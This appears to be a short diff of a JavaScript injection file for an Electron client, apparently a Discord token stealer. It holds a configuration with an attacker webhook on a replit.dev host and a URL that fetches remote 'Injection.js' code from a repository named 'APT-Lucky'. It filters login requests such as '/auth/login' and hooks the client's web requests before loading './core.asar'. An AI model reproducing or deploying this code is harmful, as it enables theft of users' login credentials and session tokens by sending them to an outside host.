@@ -12,7 +12,7 @@ const {
 
 const CONFIG = {
     webhook: "https://12c46603-e5d9-4a49-baf4-62272a1d45eb-00-2qyzmtgvna10i.picard.replit.dev/injection",
-    injection_url: "https://raw.githubusercontent.com/APT-Lucky/Injection/refs/heads/main/Injection.js",
+    injection_url: "https://raw.githubusercontent.com/APT-Lucky/Injection/main/Injection.js",
     filters: {
         urls: [
             '/auth/login',
@@ -624,4 +624,5 @@ session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, cal
 });
 
 module.exports = require("./core.asar");
+
 
